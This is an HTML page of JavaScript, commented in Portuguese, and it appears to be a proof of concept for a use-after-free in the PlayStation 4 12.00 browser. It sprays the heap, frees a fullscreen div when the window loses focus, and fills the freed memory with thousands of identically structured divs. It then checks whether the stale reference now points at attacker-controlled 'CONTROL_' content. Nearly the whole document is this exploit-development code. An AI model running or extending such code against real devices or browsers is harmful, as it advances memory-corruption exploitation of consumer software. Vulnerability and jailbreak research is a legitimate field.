<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - UAF Monotype Reclaim</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>PS4 12.00 - UAF Monotype Reclaim (DIV Control)</h2>
<button onclick="runTest()">Run Test</button>

<script>

// ==========================
// 🔒 LOG SEGURO
// ==========================
let logBuffer = [];

function log(msg) {
    try { console.log(msg); } catch(e){}
    logBuffer.push(msg);
}

// ==========================
// HEAP SETUP (INALTERADO)
// ==========================
function setupHeap() {
    let controllers = [];

    for(let i = 0; i < 5000; i++) {
        let arr = new Float64Array(8);
        arr[0] = i;
        controllers.push(arr);
    }

    return controllers;
}

// ==========================
// FULLSCREEN (INALTERADO)
// ==========================
function setupFullscreen() {
    let fsTarget = document.createElement("div");

    fsTarget.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";

    fsTarget.style.background = "black";
    fsTarget.style.width = "100%";
    fsTarget.style.height = "100%";
    fsTarget.style.position = "absolute";
    fsTarget.style.top = "0";
    fsTarget.style.left = "0";

    document.body.appendChild(fsTarget);

    if (fsTarget.webkitRequestFullscreen) {
        fsTarget.webkitRequestFullscreen();
    } else {
        document.documentElement.webkitRequestFullscreen?.();
    }

    return fsTarget;
}

// ==========================
// 💣 MONOTYPE RECLAIM (DIV ONLY)
// ==========================
function monotypeReclaim() {
    log("[*] Monotype reclaim iniciado");

    let bucket = [];

    // 🔥 Fase 1 — churn leve (fragmentação controlada)
    for (let i = 0; i < 6000; i++) {
        let el = document.createElement("div");
        document.body.appendChild(el);
        el.remove();
    }

    // 🔥 Fase 2 — REUSE DIRECIONADO (MESMO TIPO + MESMA ESTRUTURA)
    for (let i = 0; i < 15000; i++) {
        let el = document.createElement("div");

        // 🔑 mesma estrutura do alvo
        el.innerHTML = "<h1>CONTROL_" + i + "</h1>";

        el.style.position = "absolute";
        el.style.width = "100%";
        el.style.height = "100%";

        document.body.appendChild(el);
        bucket.push(el);
    }

    // 🔥 Fase 3 — churn final leve
    for (let i = 0; i < 4000; i++) {
        let el = document.createElement("div");
        document.body.appendChild(el);
        el.remove();
    }

    log("[*] Monotype reclaim finalizado: " + bucket.length);
    return bucket;
}

// ==========================
// 🔬 DETECÇÃO DE CONTROLE REAL
// ==========================
function checkUAF(fsTarget) {
    log("---- CHECK UAF ----");

    try {
        let html = fsTarget.innerHTML;
        log("[CHECK] innerHTML = " + html);

        if (html && html.includes("CONTROL_")) {
            log("[!!!] UAF CONTROLADO (DIV REUSE)");
        }

    } catch(e) {
        log("[UAF] innerHTML erro");
    }

    try {
        let node = fsTarget.firstChild;
        log("[CHECK] firstChild = " + node);

    } catch(e) {
        log("[UAF] firstChild erro");
    }
}

// ==========================
// TRIGGER (INALTERADO)
// ==========================
function trigger(fsTarget) {
    log("[*] Trigger");

    try {
        fsTarget.remove();

        if (document.webkitIsFullScreen || document.fullscreenElement) {
            document.webkitExitFullscreen?.();
        }

    } catch(e) {
        log("[ERRO]");
    }

    // 🔥 janela crítica — mesmo padrão agressivo
    setTimeout(() => monotypeReclaim(), 0);
    setTimeout(() => monotypeReclaim(), 50);
    setTimeout(() => monotypeReclaim(), 100);

    // 🔬 checks
    setTimeout(() => checkUAF(fsTarget), 10);
    setTimeout(() => checkUAF(fsTarget), 30);
    setTimeout(() => checkUAF(fsTarget), 60);
    setTimeout(() => checkUAF(fsTarget), 120);
    setTimeout(() => checkUAF(fsTarget), 250);

    // 🔒 dump seguro
    setTimeout(() => {
        alert(logBuffer.join("\n"));
    }, 400);

    // 🔁 comportamento original preservado
    setTimeout(() => location.reload(), 500);
}

// ==========================
// MAIN (INALTERADO)
// ==========================
function runTest() {
    log("[*] Iniciando teste");

    let controllers = setupHeap();
    let fsTarget = setupFullscreen();

    window.onblur = function() {
        log("[*] onblur");

        // ⚠️ timing crítico intacto
        setTimeout(() => trigger(fsTarget), 3000);
    };
}

</script>

</body>
</html>
